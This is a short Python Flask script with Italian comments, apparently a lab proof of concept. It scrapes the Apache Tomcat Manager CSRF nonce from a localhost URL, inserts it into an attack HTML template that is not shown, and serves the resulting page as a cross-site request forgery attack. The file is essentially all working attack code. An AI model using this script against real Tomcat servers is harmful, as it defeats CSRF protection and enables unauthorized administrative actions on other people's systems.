import requests
import re
from flask import Flask, render_template_string

TEMPLATE_FILE = "template-csrf-attack.html"
OUTPUT_FILE = "csrf-attack.html"
URL = "http://localhost:8080/manager/"
RE_EXP_CSRF = r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)'

app = Flask(__name__)

# Funzione per recuperare il token CSRF
def get_csrf_token():
    response = requests.get(URL)
    match = re.search(RE_EXP_CSRF, response.url)
    csrf_token = None
    if match:
        csrf_token = match.group(1)  # Ottiene il token dalla regex
    else:
        print("CSRF Token non trovato nell'URL.")
        exit(1)

    with open(TEMPLATE_FILE, 'r') as file:
        html_content = file.read()

    # Sostituisci il valore del token CSRF
    updated_content = html_content.replace("TOKEN_CSRF", csrf_token)

    return updated_content

@app.route('/')
def csrf_attack_page():
    # Genera la pagina HTML con il token CSRF
    html_page = get_csrf_token()
    return render_template_string(html_page)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
